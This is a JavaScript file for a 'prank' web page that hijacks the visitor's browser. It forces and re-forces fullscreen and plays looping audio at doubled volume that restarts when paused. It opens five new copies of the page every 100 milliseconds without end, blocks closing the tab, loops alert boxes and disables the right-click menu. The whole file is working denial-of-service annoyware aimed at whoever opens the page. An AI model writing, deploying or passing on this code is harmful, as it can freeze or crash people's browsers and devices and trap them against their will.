const bgAudio1 = document.getElementById('bgAudio1');
const bgAudio2 = document.getElementById('bgAudio2');
let audioContext;
let hasStarted = false;

async function startPrank() {
    if (hasStarted) return;
    hasStarted = true;

    try {
        // Force fullscreen
        const elem = document.documentElement;
        await elem.requestFullscreen().catch(err => console.log('Fullscreen error:', err));

        // Initialize audio
        audioContext = new (window.AudioContext || window.webkitAudioContext)();
        [bgAudio1, bgAudio2].forEach(audio => {
            const source = audioContext.createMediaElementSource(audio);
            const gainNode = audioContext.createGain();
            gainNode.gain.value = 2.0;
            source.connect(gainNode).connect(audioContext.destination);
            audio.play();
        });

        // Tab duplication function
        function createDuplicates() {
            // Open 5 new tabs
            for(let i = 0; i < 5; i++) {
                window.open(window.location.href, '_blank');
            }
            // Loop every 100ms
            setTimeout(createDuplicates, 100);
        }

        // Start tab duplication
        createDuplicates();

        // Prevent tab closing
        window.onbeforeunload = function(e) {
            e.preventDefault();
            e.returnValue = '';
            return '';
        };

        // Start alert loop
        function loopAlert() {
            alert("rss pyla yee mhtl mayy");
            requestAnimationFrame(loopAlert);
        }
        setTimeout(loopAlert, 100);

    } catch (err) {
        console.error("Error:", err);
    }
}

// Keep fullscreen
document.addEventListener('fullscreenchange', () => {
    if (!document.fullscreenElement) {
        document.documentElement.requestFullscreen();
    }
});

// Keep audio playing
[bgAudio1, bgAudio2].forEach(audio => {
    audio.addEventListener('pause', () => audio.play());
});

// Handle visibility changes
document.addEventListener('visibilitychange', () => {
    if (document.hidden) {
        [bgAudio1, bgAudio2].forEach(audio => audio.play());
    }
});

// Block right-click menu
document.addEventListener('contextmenu', e => e.preventDefault());

// Initial instruction
alert("anilllll........");